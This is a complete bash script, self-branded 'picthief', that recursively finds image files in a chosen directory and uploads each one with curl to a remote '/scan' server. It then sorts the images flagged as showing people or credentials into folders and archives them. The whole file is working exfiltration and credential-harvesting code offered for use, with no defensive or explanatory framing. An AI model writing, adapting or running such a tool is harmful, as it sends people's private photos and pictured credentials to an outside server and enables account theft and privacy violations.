#!/bin/bash
set -uo pipefail
echo '
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣶⣤⣀⣀⣤⣶⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣾⣷⣶⣶⣶⣦⣤⠀⢤⣤⣈⣉⠙⠛⠛⠋⣉⣁⣤⡤⠀⣤⣴⣶⣶⣶⣾⣷⠀
⠀⠈⠻⢿⣿⣿⣿⣿⣶⣤⣄⣉⣉⣉⣛⣛⣉⣉⣉⣠⣤⣶⣿⣿⣿⣿⡿⠟⠁⠀
⠀⠀⠀⠀⠀⠉⠙⠛⠛⠿⠿⠿⢿⣿⣿⣿⣿⡿⠿⠿⠿⠛⠛⠋⠉⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢿⣷⠦⠄⢀⣠⡀⠠⣄⡀⠠⠴⣾⡿⠀⠀⠀⠀⠀⣀⡀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢤⣤⣴⣾⣿⣿⣷⣤⣙⣿⣷⣦⣤⡤⠀⠴⠶⠟⠛⠉⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠺⣷⣄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢈⣙⣛⣻⣿⣿⣿⡿⠃⠐⠿⠿⣾⣿⣷⡄⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⠿⠋⠀⠀⠀⠀⠀⠀⠀⠈⠁⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⣿⣿⣾⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀picthief⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠛⠛⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
'

SUPPORTED_FORMATS=("png" "jpg" "jpeg" "bmp" "tiff" "gif")
PEOPLE_DIR="./people"
CRED_DIR="./cred"

error_exit() {
    echo "ERROR: $1" >&2
    exit 1
}

check_dependency() {
    local cmd="$1"
    local desc="$2"
    if ! command -v "$cmd" &> /dev/null; then
        error_exit "Missing required dependency: $desc (command $cmd not found, please install it first)"
    fi
}

parse_args() {
    local path=""
    local server=""
    while [[ $# -gt 0 ]]; do
        case "$1" in
            --path)
                [[ -z "${2:-}" ]] && error_exit "--path parameter must be followed by a directory path"
                path="$2"
                shift 2
                ;;
            --server)
                [[ -z "${2:-}" ]] && error_exit "--server parameter must be followed by server address (e.g. 127.0.0.1:5000)"
                server="$2"
                shift 2
                ;;
            *)
                error_exit "Unknown parameter: $1, supported parameters: --path <directory> --server <address:port>"
                ;;
        esac
    done

    [[ -z "$path" ]] && error_exit "--path parameter must be specified (e.g. --path ./test)"
    [[ -z "$server" ]] && error_exit "--server parameter must be specified (e.g. --server 127.0.0.1:5000)"
    [[ ! -d "$path" ]] && error_exit "Specified path does not exist: $path"

    TARGET_PATH=$(cd "$path" && pwd)
    SERVER_URL="http://${server}/scan"
}

show_progress() {
    local current=$1
    local total=$2
    local bar_length=50
    local percent=$((current * 100 / total))
    local filled_length=$((percent * bar_length / 100))
    local bar=$(printf "%${filled_length}s" | tr ' ' '>')
    local empty=$(printf "%$((bar_length - filled_length))s")  
    
    printf "\rProcessing progress: |%s%s| %d%% (%d/%d)" "$bar" "$empty" "$percent" "$current" "$total"
}

process_image() {
    local img_path="$1"
    
    local response
    response=$(curl -s -X POST -F "file=@${img_path}" "${SERVER_URL}")
    if [[ $? -ne 0 || -z "$response" ]]; then
        return 1
    fi

    local res_type=$(echo "$response" | sed -n 's/^[[:space:]]*//; s/.*"type":"\([^"]*\)".*/\1/p' | head -1)
    res_type=${res_type:-}
    if [[ -z "$res_type" ]]; then
        return 1
    fi

    if [[ "$res_type" == "NA" ]]; then
        return 0
    fi

    if [[ "$res_type" == "sense" ]]; then
        local people=$(echo "$response" | sed -n 's/^[[:space:]]*//; s/.*"people":\([0-9]*\).*/\1/p' | head -1)
        people=${people:-0}
        local cred=$(echo "$response" | sed -n 's/^[[:space:]]*//; s/.*"cred":\([0-9]*\).*/\1/p' | head -1)
        cred=${cred:-0}

        if [[ $people -ge 1 && $cred -eq 0 ]]; then
            cp -f "${img_path}" "${PEOPLE_DIR}/" >/dev/null 2>&1
        elif [[ $cred -ge 1 ]]; then
            cp -f "${img_path}" "${CRED_DIR}/" >/dev/null 2>&1
        fi
        return 0
    fi

    return 1
}

package_result() {
    local timestamp=$(date +%Y%m%d%H%M%S)
    local tar_name="${timestamp}.tar.gz"
    tar -zcf "${tar_name}" "${PEOPLE_DIR}" "${CRED_DIR}" >/dev/null 2>&1
}

main() {
    check_dependency "curl" "curl"
    parse_args "$@"
    mkdir -p "${PEOPLE_DIR}" "${CRED_DIR}" || error_exit "Failed to create target directories"
    local total_imgs=0
    while IFS= read -r -d '' img; do
        ((total_imgs++))
    done < <(find "${TARGET_PATH}" -type f \( \
        -iname "*.png" -o -iname "*.jpg" -o -iname "*.jpeg" -o \
        -iname "*.bmp" -o -iname "*.tiff" -o -iname "*.gif" \
    \) -print0)
    
    if [[ $total_imgs -eq 0 ]]; then
        error_exit "No supported image files found in target directory"
    fi
    
    local current_img=0
    while IFS= read -r -d '' img; do
        ((current_img++))
        process_image "$img"
        show_progress "$current_img" "$total_imgs"
    done < <(find "${TARGET_PATH}" -type f \( \
        -iname "*.png" -o -iname "*.jpg" -o -iname "*.jpeg" -o \
        -iname "*.bmp" -o -iname "*.tiff" -o -iname "*.gif" \
    \) -print0)
    echo -e "\nProcessing completed"
    package_result
}

main "$@"
